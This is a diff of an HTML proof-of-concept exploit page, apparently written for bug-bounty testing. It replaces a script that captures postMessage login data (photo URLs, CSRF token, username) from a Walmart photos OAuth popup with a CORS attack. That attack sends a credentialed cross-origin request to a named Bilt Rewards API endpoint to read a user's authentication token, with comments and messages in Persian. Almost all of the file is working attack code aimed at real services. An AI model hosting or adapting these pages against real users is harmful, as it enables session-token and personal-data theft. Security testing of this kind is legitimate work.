@@ -1,78 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>PoC - Photo Access Test</title>
+    <title>CORS Exploit Test - Bilt Rewards</title>
 </head>
 <body>
-    <h3>PoC - Access User Photos</h3>
-    
-    <div id="output" style="margin-top:20px;"></div>
+    <h1>CORS Token Leakage Test</h1>
+    <div id="result">در حال تلاش برای دریافت توکن...</div>
 
-<script>
-const LOGIN_URL = 'https://photos3.walmart.com/users/oauth2/login';
+    <script>
+        const targetUrl = "https://www.bilt.com/api/id/public/user/authentication/token";
 
-window.onload = function () {
-    console.log('Auto opening login popup...');
-    
-    const popup = window.open(LOGIN_URL, 'loginPopup', 'width=700,height=800');
+        // ایجاد درخواست با استفاده از XMLHttpRequest برای بررسی دقیق‌تر هدرها
+        var xhr = new XMLHttpRequest();
+        
+        xhr.open("GET", targetUrl, true);
+        
+        // ارسال کوکی‌ها و اطلاعات احراز هویت (بسیار مهم برای حمله CORS)
+        xhr.withCredentials = true;
 
-    if (!popup) {
-        alert('Popup blocked! Allow popups.');
-        return;
-    }
-
-    window.addEventListener('message', function(event) {
-        if (event.origin !== 'https://photos3.walmart.com' && 
-            event.origin !== 'https://www.walmart.com') {
-            return;
-        }
-
-        console.log('Message received from:', event.origin);
-
-        if (typeof event.data === 'string' && event.data.includes('login:')) {
-            try {
-                const jsonStr = event.data.split('login:')[1];
-                const data = JSON.parse(jsonStr);
-
-                const output = document.getElementById('output');
-                output.innerHTML = '<h4>✅ Captured Data:</h4>';
-                output.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
-
-                const photoUrl = data.previous_basket_contents?.prints_thumbnail;
-                const printIds = data.previous_basket_contents?.print_ids;
-
-                if (photoUrl) {
-                    output.innerHTML += '<h4>📸 User Photo URL:</h4>';
-                    output.innerHTML += '<p>' + photoUrl + '</p>';
-
-                    // Auto open in new tab
-                    window.open(photoUrl, '_blank');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+                if (xhr.status == 200) {
+                    // اگر پاسخ با موفقیت دریافت شود، توکن نشت پیدا کرده است
+                    document.getElementById("result").innerHTML = 
+                        "<h3>Success! Token Leaked:</h3><pre>" + xhr.responseText + "</pre>";
+                    console.log("Leaked Data:", xhr.responseText);
+                } else {
+                    document.getElementById("result").innerHTML = 
+                        "خطا در دریافت پاسخ. وضعیت: " + xhr.status + 
+                        "<br>احتمالاً CORS به درستی پیکربندی شده یا شما لاگین نیستید.";
                 }
-
-                if (printIds && printIds.length > 0) {
-                    output.innerHTML += '<h4>📋 Print IDs:</h4>';
-                    output.innerHTML += '<p>' + printIds.join(', ') + '</p>';
-                }
-
-                if (data.csrf) {
-                    output.innerHTML += '<h4>🔑 CSRF Token:</h4>';
-                    output.innerHTML += '<p>' + data.csrf + '</p>';
-                }
-
-                if (data.logged_in_user_name) {
-                    output.innerHTML += '<h4>👤 Logged in User:</h4>';
-                    output.innerHTML += '<p>' + data.logged_in_user_name + '</p>';
-                }
-
-            } catch (e) {
-                console.error('Parsing error:', e);
             }
-        }
-    });
+        };
 
-    console.log('Waiting for login...');
-};
-</script>
+        xhr.send();
+    </script>
 </body>
 </html>
